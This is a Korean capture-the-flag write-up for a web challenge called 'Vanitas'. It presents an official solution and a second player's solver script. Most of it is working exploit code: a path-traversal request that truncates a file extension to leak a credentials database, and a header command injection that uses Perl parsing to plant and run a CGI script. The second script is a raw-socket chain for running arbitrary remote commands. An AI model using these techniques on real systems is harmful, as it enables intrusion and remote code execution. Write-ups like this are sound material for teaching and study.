# Web1 - Vanitas

### 공식 Writeup
locale에 맞는 html 파일을 가져올 때 snprintf를 사용하여 글자 수를 잘 맞추면 뒤의 .html을 truncate시키는 것이 가능. 이를 이용해 .db를 leak하여 아이디 및 비밀번호를 획득. (Ref. CVE-2018-13379)

```c
char *locale = strdup(request->path + 1); locale[strlen(request->path) - 5] = '\0'; snprintf(filepath, 0x100, "html/auth/%s.html", locale);
```

```sh
$ curl http://52.78.31.14/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////../../.db/auth --path-as-is --output .db 

$ sqlite3 .db 
SQLite version 3.37.2 2022-01-06 13:25:41 Enter ".help" for usage hints. 
sqlite> select * from users; 
vanitas_vanitatum_791e45a8|et_omnia_vanitas_8ec1ac9e
```

diagnosis 쪽에서 command injection이 있지만 filter로 인해 직접적인 RCE가 어려운 상황

```c
char command[0x100];  
host = get_http_request_header(request, "X-Target"); 
check_command(fd, host); 
snprintf(command, 0x100, "ping %s", host);
```

간단한 python/perl cgi 기능이 존재함

```c
if (endswith(cgi_path, ".py")) {    
	snprintf(command, 0x100, "/usr/bin/python3 %s", cgi_path);
} else if (endswith(cgi_path, ".pl")) {     
	snprintf(command, 0x100, "/usr/bin/perl %s", cgi_path); 
} else {     
	send_http_response_404(fd);     
	exit(EXIT_SUCCESS);
}
```

python에서는 불가능하지만 perl에서는 ":" 문자가 goto label로 인식된다는 점을 이용하면 이러한 것이 가능함. (Ref. CVE-2019-11539)

```sh
ubuntu@ip-10-0-13-168:~$ ping "print 123#" 2>&1 
ping: print 123#: Name or service not known

ubuntu@ip-10-0-13-168:~$ ping "print 123#" 2>&1 | perl 
123
```

command injection filter에 ">" 문자는 막혀있지 않기 때문에 이를 이용해 cgi-bin에 펄 스크립트를 작성 후 실행
X-target의 \는 이스케이핑이고 `\t` 에서 `\`를 이스케이핑 하기 위해서 두 번 이스케이핑 한 것
`flag_645b0ab1d0f09363d9cf86ea7dd85a34` 가 실제 플래그 이름

```python
import requests

TARGET = 'http://52.78.31.14'
response = requests.get(TARGET + '/en/diagnosis', headers = {
    'Cookie' : 'auth=vanitas_vanitatum_791e45a8|et_omnia_vanitas_8ec1ac9e',
    'X-Target' : '\\$x=\\"cat\\\\t/flag_645b0ab1d0f09363d9cf86ea7dd85a34\\",system\\$x# 2> cgi-bin/asdfasdjklfjklas.pl',
})
print(response.status_code)

response = requests.get(TARGET + '/cgi-bin/asdfasdjklfjklas.pl')
print(response.text)
```


### movptr Writeup

```python
#!/usr/bin/env python3

from socket import socket, AF_INET, SOCK_STREAM

import sqlite3

import uuid
import sys

RHOST = "52.78.31.14"
RPORT = 80
CMD = sys.argv[1]

database = "/home/user/.db"

path = b""
path += b"../../../../"
path += database.encode()
path += b"/auth"

path = b"/" + (250 - len(path)) * b"/" + path

buf = b""
buf += b"GET " + path + b" HTTP/1.1\r\n"
buf += b"Accept: */*\r\n"
buf += b"\r\n"

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((RHOST, RPORT))

soc.send(buf)
res = soc.recv(65535)
soc.close()

start = res.index(b"\r\n\r\n")
res = res[start + 4:]

with open(".db", "wb") as f:
    f.write(res)

con = sqlite3.connect(".db")
cur = con.cursor()
cur.execute('SELECT * FROM users')
user_id, user_pw = cur.fetchone()

user_id = user_id.encode()
user_pw = user_pw.encode()

tmp = (uuid.uuid4().hex + ".pl").encode()

buf = b""
buf += b"GET /diagnosis HTTP/1.1\r\n"
buf += b"X-Target: 'exec \"" + CMD.encode() + b"\" #' 2>/tmp/" + tmp + b" \r\n"
buf += b"Cookie: auth=" + user_id + b"|" + user_pw + b"\r\n"
buf += b"Accept: */*\r\n"
buf += b"\r\n"

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((RHOST, RPORT))

soc.send(buf)
res = soc.recv(65535)
soc.close()

path = b"/cgi-bin/"
path += b"../../../tmp/" + tmp

buf = b""
buf += b"GET " + path + b" HTTP/1.1\r\n"
buf += b"Accept: */*\r\n"
buf += b"\r\n"

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((RHOST, RPORT))

soc.send(buf)
res = soc.recv(65535)
soc.close()

start = res.index(b"\r\n\r\n")
res = res[start + 4:]

print(res.decode())
```